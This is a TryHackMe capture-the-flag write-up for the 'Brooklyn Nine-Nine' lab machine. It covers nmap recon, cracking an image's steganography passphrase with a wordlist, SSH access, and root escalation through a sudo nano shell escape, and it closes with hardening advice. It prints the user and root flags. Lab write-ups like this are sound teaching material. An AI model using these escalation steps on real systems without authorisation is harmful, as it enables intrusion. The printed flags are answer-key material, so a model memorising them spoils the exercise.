---

# 🕵️‍♂️ Brooklyn Nine-Nine — TryHackMe Writeup

**Author:** Miraç Akkuş (LatenT)

**Date:** May 2026

**Room:** [Brooklyn Nine-Nine](https://tryhackme.com/room/brooklynninenine)

## 📋 Summary

This report documents the exploitation process for the Brooklyn Nine-Nine machine on TryHackMe. The path to root involves analyzing hidden data within images (steganography) and exploiting misconfigured sudo privileges.

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

I started with an `nmap` scan to identify open ports and running services:

```bash
nmap -sV -sC -A <TARGET_IP>

```

**Findings:**

* **Port 21 (FTP):** Anonymous login is enabled.
* **Port 22 (SSH):** Open for remote access.
* **Port 80 (HTTP):** Apache server hosting a static webpage.

---

## 🖼️ Phase 2: Steganography (Initial Foothold)

During the web enumeration, an image named `brooklyn99.jpg` was discovered. To check for hidden data, I used **StegSeek**, which is significantly faster than `steghide` for cracking passphrases.

**Exploitation:**

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt

```

**Results:**

* **Found Passphrase:** `admin`
* **Extracted File:** `note.txt`
* **Content:** The file contained login credentials/hints for the user **holt**.

---

## 🔑 Phase 3: User Access

Using the discovered credentials, I established a connection via SSH:

```bash
ssh holt@<TARGET_IP>

```

* **User Flag:** `ee11cbb19052e40b07aac0ca060c23ee`

---

## 🚀 Phase 4: Privilege Escalation (Root)

After gaining user access, I checked the current sudo permissions:

```bash
sudo -l

```

**Vulnerability:**
The user `holt` is permitted to run `/bin/nano` as root without a password:
`(ALL) NOPASSWD: /bin/nano`

**Exploitation (GTFOBins Method):**
To spawn a root shell through nano, I followed these steps:

1. Run `sudo nano`.
2. Press `Ctrl+R` then `Ctrl+X`.
3. Enter the following command:
```bash
reset; sh 1>&0 2>&0

```



**Verification:**

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

```

---

## 🏁 Phase 5: Final (Root Flag)

The root flag was located in its standard directory:

* **Location:** `/root/root.txt`
* **Root Flag:** `63a9f0ea7bb98050796b649e85481845`

---

## 🛡️ Recommendations & Prevention

* **Password Policy:** Ensure that any data hidden within assets is protected by strong, complex passwords resistant to dictionary attacks.
* **Principle of Least Privilege:** Avoid granting `NOPASSWD` sudo rights to text editors like `nano` or `vi`. These tools have built-in functions that make it trivial to escape to a shell.

---

**Author:** Miraç Akkuş (LatenT)

**Date:** May 2026

```

```
